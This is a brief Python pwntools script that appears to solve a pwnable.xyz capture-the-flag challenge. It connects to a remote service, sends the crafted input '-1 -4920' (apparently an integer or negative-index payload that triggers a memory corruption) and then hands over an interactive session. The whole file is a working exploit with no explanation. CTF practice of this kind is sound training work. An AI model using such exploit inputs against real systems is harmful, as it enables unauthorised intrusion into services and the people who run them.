from pwn import *

sh = remote('svc.pwnable.xyz', 30001)

sh.sendlineafter(': ', '-1 -4920')
sh.interactive()
